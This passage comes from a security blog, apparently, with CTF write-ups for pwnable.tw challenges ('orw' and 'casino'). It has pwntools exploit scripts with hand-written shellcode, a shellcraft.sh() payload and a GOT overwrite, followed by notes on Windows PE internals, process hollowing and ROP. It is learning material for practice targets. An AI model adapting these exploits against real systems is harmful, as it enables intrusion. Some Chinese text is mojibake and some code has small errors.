class="line"><span class="string">    shellcraft.read( &#x27;rax&#x27; , &#x27;rsp&#x27; , 0x30 ) +</span></span><br><span class="line"><span class="string">    shellcraft.write( 1 , &#x27;rsp&#x27; , 0x30 )</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">y.sendafter( <span class="string">b&#x27;:&#x27;</span> , sc )</span><br><span class="line"></span><br><span class="line">y.sendlineafter( <span class="string">b&#x27;:)&#x27;</span> , <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64( <span class="number">0x6010a0</span> ) )</span><br><span class="line"></span><br><span class="line">y.interactive()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r.sendlineafter(b&#x27;&gt;&#x27; ,sc)</span></span><br><span class="line"><span class="string">r.sendlineafter(b&#x27;:)&#x27; ,b&#x27;a&#x27;*18 + p64(0x601060))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r.interactive()</span></span><br></pre></td></tr></table></figure></div><h3 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable orw"></a>pwnable orw</h3><ul><li><code>x86 (32bit syscall)</code></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process,remote, p64,asm,context,shellcraft ,success</span><br><span class="line"></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="comment"># xor rdi, rdi       ; å°‡ rdi å¯„å­˜å™¨æ¸…é›¶ï¼Œç”¨ä½œæ–‡ä»¶æè¿°ç¬¦</span></span><br><span class="line"><span class="comment"># mov rsi, 0x60100   ; å°‡ rsi å¯„å­˜å™¨è¨­ç½®ç‚ºç·©è¡å€çš„åœ°å€ï¼ˆ0x60100ï¼‰</span></span><br><span class="line"><span class="comment"># mov rdx, 0x100     ; å°‡ rdx å¯„å­˜å™¨è¨­ç½®ç‚ºè¦è®€å–çš„å­—ç¯€æ•¸ï¼ˆ0x100ï¼Œ256 å­—ç¯€ï¼‰</span></span><br><span class="line"><span class="comment"># mov eax, 0         ; å°‡ eax å¯„å­˜å™¨è¨­ç½®ç‚ºç³»çµ±èª¿ç”¨ç·¨è™Ÿï¼Œ0 è¡¨ç¤º read</span></span><br><span class="line"><span class="comment"># syscall            ; åŸ·è¡Œç³»çµ±èª¿ç”¨</span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line">context.arch =<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os =<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">sc = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov eax ,0x5</span></span><br><span class="line"><span class="string">    push 0x00006761</span></span><br><span class="line"><span class="string">    push 0x6c662f77</span></span><br><span class="line"><span class="string">    push 0x726f2f65</span></span><br><span class="line"><span class="string">    push 0x6d6f682f</span></span><br><span class="line"><span class="string">    mov ebx, esp</span></span><br><span class="line"><span class="string">    xor ecx, ecx</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    // open( &quot;/home/orw/flag&quot; , 0 , 0 )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov ecx, ebx</span></span><br><span class="line"><span class="string">    mov ebx,eax</span></span><br><span class="line"><span class="string">    mov eax,0x3</span></span><br><span class="line"><span class="string">    mov edx, 0x60</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    // read( fd , rsp , 0x50 )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov eax, 0x4</span></span><br><span class="line"><span class="string">    mov ebx,0x1</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    // write( 1 , rsp , 0x50 )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sc = asm(</span></span><br><span class="line"><span class="comment">#     shellcraft.open(b&#x27;/home/orw/flag&#x27;)+</span></span><br><span class="line"><span class="comment">#     shellcraft.read(&#x27;eax&#x27;,&#x27;esp&#x27;,50)+</span></span><br><span class="line"><span class="comment">#     shellcraft.write(&#x27;1&#x27;,&#x27;esp&#x27;,50)</span></span><br><span class="line"><span class="comment"># ) </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">of = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x12</span> + p64(<span class="number">0x804a060</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;:&#x27;</span>, sc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><br><h2 id="casino"><a href="#casino" class="headerlink" title="casino"></a>casino</h2><ul><li><code>checksec casino</code></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/SkyRhVJ0a.png"                      alt="image"                ></p><blockquote><p><code>Partial RELOAD</code> , <code>No PIE</code></p></blockquote><h3 id="name-age-seed-shellcode"><a href="#name-age-seed-shellcode" class="headerlink" title="name,age,seed,shellcode"></a>name,age,seed,shellcode</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># age =0 , seed =0</span></span><br><span class="line">name = <span class="string">b&#x27;0x6020f0&#x27;</span> <span class="comment"># name address</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># address of name , seed , age ,sc is </span></span><br><span class="line"><span class="comment"># 0x6020f0 , 0x602100 , 0x602104 , 0x602108</span></span><br><span class="line">sc = shellcraft.sh()</span><br><span class="line">payload = name + <span class="string">&#x27;/x00&#x27;</span>*<span class="number">4</span> + <span class="string">&#x27;/x00&#x27;</span>*<span class="number">4</span> + asm(sc)</span><br></pre></td></tr></table></figure></div><h3 id="Ans"><a href="#Ans" class="headerlink" title="Ans"></a>Ans</h3><ul><li><p>lottery.c</p><blockquote><p>åªè¦ <code>seed</code> ä¸€æ¨£ <code>srand</code> ç”Ÿæˆçš„äº‚æ•¸å°±æœƒä¸€æ¨£ -&gt; overflow è¨­å®š <code>seed = 0</code> ç”¢ç”Ÿ <code>lottery</code></p></blockquote><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> lottery[<span class="number">6</span>] =&#123;&#125;;</span><br><span class="line">    <span class="type">int</span> seed = <span class="number">0</span> ;</span><br><span class="line">    srand(seed);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        lottery[i] = rand() %<span class="number">100</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,lottery[i]);</span><br><span class="line">        <span class="comment">// 83,86,77,15,93,35</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;%d&quot;</span>,&amp;lottery[<span class="number">-43</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>exp</p></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote, p64,context,shellcraft,asm</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r= remote(<span class="string">&#x27;192.168.56.1&#x27;</span>,<span class="number">10172</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="string">b&#x27;0x6020f0&#x27;</span> <span class="comment"># name address</span></span><br><span class="line"><span class="comment"># address of name , seed , age ,sc is </span></span><br><span class="line"><span class="comment"># 0x6020f0 , 0x602100 , 0x602104 , 0x602108</span></span><br><span class="line">sc = shellcraft.sh()</span><br><span class="line">payload = name + <span class="string">&#x27;/x00&#x27;</span>*<span class="number">4</span> + <span class="string">&#x27;/x00&#x27;</span>*<span class="number">4</span> + asm(sc)</span><br><span class="line"></span><br><span class="line">lottery = [<span class="number">83</span>,<span class="number">86</span>,<span class="number">77</span>,<span class="number">15</span>,<span class="number">93</span>,<span class="number">35</span>]</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:  &#x27;</span>,payload)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:  &#x27;</span>,<span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># age + Lottery</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;: &#x27;</span>,<span class="string">b&#x27;22&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;-42&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lottery:</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;-43&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;0&quot;</span>) <span class="comment"># -&gt; clean put@got.plt</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;: &#x27;</span>,<span class="string">b&#x27;6299912&#x27;</span>) <span class="comment"># sc = 0x602108 = 6299912</span></span><br><span class="line"><span class="comment"># guess 0x6020d0</span></span><br><span class="line"><span class="comment"># put@plt 0x602024</span></span><br><span class="line"><span class="comment"># 0x6020d0 - (0x602020, 0x602024) = (0xB0,0xac)</span></span><br><span class="line"><span class="comment"># (0xB0,0xac) /4 = (44 ,43) =&gt; (-43 , -42) -&gt; overflow</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="plt"><a href="#plt" class="headerlink" title="plt"></a>plt</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/H1Se9By0T.png"                      alt="image"                ></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># guess 0x6020d0</span></span><br><span class="line"><span class="comment"># put@plt 0x602024</span></span><br><span class="line"><span class="comment"># 0x6020d0 - (0x602020, 0x602024) = (0xB0,0xac)</span></span><br><span class="line"><span class="comment"># (0xB0,0xac) /4 = (44 ,43) =&gt; (-43 , -42)</span></span><br></pre></td></tr></table></figure></div><p>æœ€å¾Œå¡«å…¥ shellcode address <code>0x602108 = 6299912</code></p><p><code>cat /home/casino/flag</code></p><p><code>REF</code> : <a class="link"   href="https://hackmd.io/@a5180352/ByCIQhQ2H" >https://hackmd.io/@a5180352/ByCIQhQ2H <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WinREV-WriteUp</title>
      <link href="/2024/08/05/rev-1/"/>
      <url>/2024/08/05/rev-1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>From <code>aaaddress1</code> <a class="link"   href="https://www.youtube.com/watch?v=O8AQwUaTmdI" >è³‡å®‰é£Ÿç‰©ä¸å¥½åƒ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h2 id="Compiler"><a href="#Compiler" class="headerlink" title="Compiler"></a>Compiler</h2><h3 id="c-exe"><a href="#c-exe" class="headerlink" title=".c -&gt; .exe"></a>.c -&gt; .exe</h3><ol><li><strong>Source.cpp</strong> -&gt; <code>Compiler</code> -&gt;</li><li><strong>Assembly codes</strong> -&gt;<code>Assembler</code> -&gt;</li><li><strong>Object file</strong> -&gt; <code>Linker</code> -&gt;</li><li><strong>Main.exe</strong></li></ol><h3 id="Data-section"><a href="#Data-section" class="headerlink" title="Data section"></a>Data section</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/BySKnRdo6.png"                      alt="image"                ></p><p><code>.rdata Section</code>: push offset -&gt; å¾è¨˜æ†¶é«”æ‰¾åˆ°è®Šæ•¸å…§å®¹</p><p><code>.idata Section</code>: Import address table</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/S1CDpCuip.png"                      alt="image"                ></p><h3 id="Assemble-to-machine-code"><a href="#Assemble-to-machine-code" class="headerlink" title="Assemble to machine code"></a>Assemble to machine code</h3><p><code>.text Section</code></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">push 0            ; 6A 00</span><br><span class="line">push Oxdead       ; 68 AD DE 00 00</span><br><span class="line"></span><br><span class="line">push Oxbeef       ; 68 EF BE 00 00</span><br><span class="line">push 0            ; Ğ±Ğ 00</span><br><span class="line">call ds: 0xcafe   ; FF 15 FE CA 00 00</span><br><span class="line">xor eax, eax      ; 33 CO</span><br><span class="line">ret               ; C3</span><br></pre></td></tr></table></figure></div><h3 id="Finish"><a href="#Finish" class="headerlink" title="Finish"></a>Finish</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/SJiGy1YjT.png"                      alt="image"                ></p><ul><li><code>.data Section</code> point to <code>.text Section</code></li></ul><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$gcc</span> -S hell_world.c ; compile only ,no assemble and linker -&gt; hell_world.s</span><br><span class="line"><span class="variable">$gcc</span> -masn=intel -S hell_world.c ; x86 asm</span><br><span class="line"><span class="variable">$gcc</span> -c hell_world.c ; compile and assemble ,on linker -&gt; hell_world.o (COFF object file) </span><br></pre></td></tr></table></figure></div><h2 id="COFF-File"><a href="#COFF-File" class="headerlink" title="COFF File"></a>COFF File</h2><p><code>PE viewer</code></p><blockquote><p><a class="link"   href="https://ithelp.ithome.com.tw/articles/10187490" >è§£æ PE æ–‡ä»¶æ ¼å¼ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h3 id="æ¬„ä½"><a href="#æ¬„ä½" class="headerlink" title="æ¬„ä½"></a>æ¬„ä½</h3><ul><li>IMAGE_FILE_HEADER</li><li>IMAGE_SECTION_HEADER<br>â€¦</li><li>SECTION<ul><li>.text</li><li>.data</li></ul><ul><li>textS_Z6printfPKcz</li><li>.rdata</li><li>.rdataSzzz</li><li>.eh_frames_26printfPKcz</li><li>.eh_frame</li></ul></li></ul><p><code>Visual Studio</code> æŸ¥çœ‹æ¬„ä½</p><h3 id="Symbol-table"><a href="#Symbol-table" class="headerlink" title="Symbol table"></a>Symbol table</h3><blockquote><p>é¡¯ç¤ºæ¬„ä½ä¸­åŒ…å«çš„è®Šæ•¸</p></blockquote><ul><li>Strip<br><code>gcc -o output_file input_file.c [--strip or -s ]</code></li></ul><blockquote><p>ç”¨æ–¼å¾ç›®æ¨™æ–‡ä»¶ä¸­åˆªé™¤ç¬¦è™Ÿè¡¨å’Œèª¿è©¦ä¿¡æ¯ã€‚é€™å¯ä»¥æ¸›å°‘ç›®æ¨™æ–‡ä»¶çš„å¤§å°ï¼Œä½¿å…¶æ›´é©åˆç”¨æ–¼éƒ¨ç½²ã€‚</p></blockquote><h3 id="Read-COFF"><a href="#Read-COFF" class="headerlink" title="Read COFF"></a>Read COFF</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/HkxarkYiT.png"                      alt="image"                ></p><h2 id="Linker"><a href="#Linker" class="headerlink" title="Linker"></a>Linker</h2><p><code>COFF overview</code></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/B1GvWbKsT.png"                      alt="image"                ></p><h3 id="cat-a-out"><a href="#cat-a-out" class="headerlink" title="cat .&#x2F;a.out"></a>cat .&#x2F;a.out</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/H1V_lZto6.png"                      alt="image"                ></p><h3 id="cat-PE"><a href="#cat-PE" class="headerlink" title="cat .&#x2F;PE"></a>cat .&#x2F;PE</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/S1BhfZFjT.png"                      alt="image"                ></p><h3 id="è¨ˆç®—æ–·é»"><a href="#è¨ˆç®—æ–·é»" class="headerlink" title="è¨ˆç®—æ–·é»"></a>è¨ˆç®—æ–·é»</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/BkIRoZFo6.png"                      alt="image"                ></p><ul><li><code>Star point</code> &#x3D; Entry-Point + Image-Base</li></ul><h3 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/ryJqQKnsT.png"                      alt="image"                ></p><ol><li>CreateProcess</li><li>ChildProcess</li><li><code>File Mapping</code></li><li>Kernal base module</li><li>To AddressOfEntry</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/rJU4rKhjp.png"                      alt="image"                ></p><ol><li>Stack</li><li>NT Header</li><li>Section Header Array</li><li>Data</li></ol><p><a href="https://hackmd.io/@alan303138/Sy26KTAJY#%E8%BC%89%E5%85%A5%E5%99%A8"><strong>Loader</strong></a> -&gt; Section Mapping</p><blockquote><p>NT header from <code>4000000</code>, before is stack memory</p></blockquote><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/ByoJDcb30.png"                      alt="image"                ></p><p>local variable -&gt; stack<br>golbal variable -&gt; .data .idata</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/BkOhdgMnR.png"                      alt="æˆªåœ– 2024-09-01 22.22.33"                ></p><blockquote><p><a class="link"   href="https://ithelp.ithome.com.tw/articles/10187582" >Import table <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><ul><li>Mult threads from Modules</li><li>æ¯æ–°å¢ä¸€å€‹Threadæœƒå‰µå»ºä¸€å€‹ TEB åœ¨ process ä¸­</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/BJs-0ZM3R.png"                      alt="æˆªåœ– 2024-09-01 23.53.27"                ></p><blockquote><p>åŸ·è¡Œç·’ç’°å¢ƒå¡Šï¼ˆThread Environment Blockï¼ŒTEBï¼‰<br>access from FS segment register when operating on  32 bits ,and from GS in 64 bits</p></blockquote><ul><li>FS[0] -&gt; ExceptionList</li><li>FS[0x4] -&gt; StackBase</li><li>FS[0x8] -&gt; StackLimit</li><li>FS[0x18] -&gt; å¯ä»¥æ‹¿åˆ°æ•´å¡ŠTEBçš„è¨˜æ†¶é«”ä½ç½®</li><li>FS[0x30] -&gt; PEB</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://hackmd.io/_uploads/r1GDCZMn0.png"                      alt="image"                ></p><blockquote><p><a class="link"   href="https://learn.microsoft.com/zh-tw/windows/win32/api/winternl/ns-winternl-peb" >PEB çµæ§‹ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><ul><li>File mapping å¾Œå‰µå»º PEB </li><li>FS[0x30] PEB -&gt; File name&#x2F;path , Command lineä¸‹çš„åƒæ•¸</li></ul><blockquote><p>ä¸è«–æ˜¯ .exe é‚„æ˜¯ .dll éƒ½æ˜¯ä¸€å€‹ Obj File çš„å°è£ï¼Œæœ‰ mapping é€²ä¸åŒçš„module</p><blockquote><p>PEB offset +8 , ImageBaseAddress -&gt; æ¨™ç¤ºå‡ºå“ªä¸€å€‹ Module æ˜¯ä¸»è¦çš„ (é€²å»ä¹‹å¾Œæ‡‰è©²å°±æœƒçœ‹åˆ° MZ , DosHeader)</p></blockquote></blockquote><ul><li>main æ˜¯å°æ–¼é–‹ç™¼è€…çš„å…¥å£é»</li><li>åœ¨ linkingéç¨‹ä¸­ linkeræœƒæŠŠä¸€åŒ…ç¨‹å¼è£åœ¨å‰é¢ï¼Œä¾†è‡ª<code>c://windows/sysWOW64/msvcrt.dll</code></li><li>ä½¿ç”¨ cff explorer å¯ä»¥çœ‹åˆ° dll è£¡é¢æœ‰ä»€éº¼æ±è¥¿</li></ul><blockquote><p><a class="link"   href="https://ithelp.ithome.com.tw/m/articles/10241357" >dll é¡¯å¾®é¡ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><ul><li>å¾ eaxçš„è®ŠåŒ–å°±å¯ä»¥å¤§æ¦‚çœ‹å‡ºä»–å¤§æ¦‚åšäº†ä»€éº¼</li></ul><h3 id="Process-Hollowing"><a href="#Process-Hollowing" class="headerlink" title="Process Hollowing"></a>Process Hollowing</h3><p><a class="link"   href="https://ithelp.ithome.com.tw/articles/10277670" >r <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><ul><li>M: My program</li><li>T: Target exe (Have digital sign)</li></ul><ol><li>Maping T</li><li>write_memory æ³¨å…¥åˆ°Tçš„è¨˜æ†¶é«”ä¸­</li><li>æŠŠï¼´çš„å‡½æ•¸å…¥å£é»æ”¹æˆï¼­çš„</li></ol><h3 id="Review-exe"><a href="#Review-exe" class="headerlink" title="Review exe"></a>Review exe</h3><p><code>PE-bear</code><br><code>x64-dbg</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> rev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Yuawn Binary exploitation WriteUp</title>
      <link href="/2024/08/05/pwn-2/"/>
      <url>/2024/08/05/pwn-2/</url>
      
        <content type="html"><![CDATA[<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><blockquote><p>Return Oriented Programming<br>From <code>yuawn</code> <a class="link"   href="https://github.com/yuawn/NTU-Computer-Security" >NTU-Computer-Security <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><ul><li><input checked="" disabled="" type="checkbox"> week1</li><li><input checked="" disabled="" type="checkbox"> week2</li><li><input disabled="" type="checkbox"> week3</li><li><input disabled="" type="checkbox"> PicoCTF.com</li><li><input disabled="" type="checkbox"> <a class="link"   href="https://pwn.college/" >pwn.college <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><input disabled="" type="checkbox"> Pwnable.tw</li></ul><h2 id="pwntools-interact-with-gdb"><a href="#pwntools-interact-with-gdb" class="headerlink" title="pwntools interact with gdb"></a>pwntools interact with gdb</h2><ul><li>tmux</li><li><code>pause()</code> ,  gdb <code>attach pid</code></li></ul><h2 id="ROP-Gadgets"><a href="#ROP-Gadgets" class="headerlink" title="ROP Gadgets"></a>ROP Gadgets</h2><blockquote><p><a class="link"   href="https://tech-blog.cymetrics.io/posts/crystal/pwn-intro-2/" >ROP Gadgets <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><ul><li><a class="link"   href="https://github.com/JonathanSalwan/ROPgadget" >ROPgadget <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://github.com/sashs/Ropper" >Ropper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><blockquote><p>base on <a class="link"   href="https://github.com/capstone-engine/capstone" >capstone <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h3 id="ROP-1"><a href="#ROP-1" class="headerlink" title="ROP"></a>ROP</h3><blockquote><p>For <strong>NX</strong> </p></blockquote><ul><li>åœ¨ <strong>code segment</strong> å°‹æ‰¾ gadgets å æˆä¸€ä¸² return address chain (<strong>ROP chain</strong>)</li><li>é€égadgetsä¸²å‡ºä»£ç¢¼åŸ·è¡Œï¼Œç¹é NX </li><li>é¦–å…ˆï¼Œå°‡å‡½æ•¸è¿”å›åœ°å€å½ˆå‡ºï¼Œå°‡<code>rsp</code>æŒ‡å‘ç¬¬äºŒå€‹ Return address ä¸¦è·³è½‰è‡³åŸ·è¡Œç¬¬ä¸€å€‹ Return addressã€‚æ¥è‘—åŸ·è¡Œ <strong>ret</strong> instructionï¼Œä¸¦åœ¨ä¸€é–‹å§‹æ”¾ç½®å¥½ç¬¬äºŒå€‹ return addressï¼Œå¾è€Œå¯¦ç¾æŒçºŒ control flowã€‚é€šéåè¦†åŸ·è¡Œæ­¤æ“ä½œï¼Œé”åˆ° Return Oriented Programming attack çš„ç›®çš„ã€‚</li></ul><h3 id="Control-register"><a href="#Control-register" class="headerlink" title="Control register"></a>Control register</h3><p><code>Gadget - pop &lt;reg&gt;; ret;</code></p><blockquote><p>Gadget ä¾†æº</p><blockquote><p>ä¸åªæœ‰å®Œæ•´instructionå¯ä»¥å½¢æˆGadgetï¼Œåªè¦è·³çš„ä½ç½®åˆé©ï¼Œå¯èƒ½é€£valueä¹Ÿå¯ä»¥è¢«è§£ææˆå¯åŸ·è¡Œçš„Gadget</p></blockquote></blockquote><ul><li>ç”¨ROP chainå‡º 